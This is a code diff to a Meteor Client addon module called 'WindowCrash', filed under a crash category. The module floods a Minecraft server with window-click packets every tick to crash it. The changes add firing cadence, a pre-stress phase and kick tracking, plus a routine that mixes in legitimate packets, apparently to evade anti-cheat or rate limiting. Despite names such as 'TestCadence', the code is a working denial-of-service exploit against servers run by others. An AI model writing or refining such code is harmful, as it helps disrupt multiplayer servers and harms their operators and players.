@@ -3,6 +3,7 @@ package com.example.addon.modules.crash;
 import com.example.addon.AddonTemplate;
 import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
+import meteordevelopment.meteorclient.events.packets.PacketEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.BoolSetting;
 import meteordevelopment.meteorclient.settings.IntSetting;
@@ -44,6 +45,11 @@ public class WindowCrash extends Module {
         .name("packets-per-tick").description("Packets sent each tick.")
         .defaultValue(6).min(1).sliderMax(12).build()
     );
+
+    private final TestCadence cadence = new TestCadence(sgGeneral);
+    private final PreStress preStress = new PreStress(sgGeneral);
+    private final GracefulResponse gr = new GracefulResponse(sgGeneral);
+
     private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
         .name("auto-disable").description("Disable when kicked from the server.")
         .defaultValue(true).build()
@@ -54,7 +60,6 @@ public class WindowCrash extends Module {
     );
 
     private int ticksActive = 0, packetsSent = 0;
-    private boolean kicked = false;
 
     public WindowCrash() {
         super(AddonTemplate.CRASH_CATEGORY, "window-crash",
@@ -62,12 +67,17 @@ public class WindowCrash extends Module {
     }
 
     @Override
-    public void onActivate() { ticksActive = 0; packetsSent = 0; kicked = false; }
+    public void onActivate() {
+        ticksActive = 0; packetsSent = 0;
+        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
+    }
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
         if (mc.player == null || mc.player.currentScreenHandler == null) return;
         ticksActive++;
+        gr.tick();
+        if (!cadence.shouldFire()) return;
         ScreenHandler handler = mc.player.currentScreenHandler;
         for (int i = 0; i < packets.get() + 1; i++) {
             mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
@@ -76,19 +86,25 @@ public class WindowCrash extends Module {
                 new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
             packetsSent++;
         }
+        gr.markFired();
+        TestCadence.sendLegit(mc.player, cadence.legitRatio());
     }
 
     @Override
     public void onDeactivate() {
         if (showStats.get()) {
             info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
-            info("  Server kicked: %s", kicked ? "YES — rejection detected" : "no kick observed");
+            gr.report(l -> info("%s", l));
         }
+        preStress.onDeactivate();
     }
 
     @EventHandler
+    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }
+
+    @EventHandler
     private void onGameLeft(GameLeftEvent event) {
-        kicked = true;
+        gr.onKick();
         if (autoDisable.get() && isActive()) toggle();
     }
 }
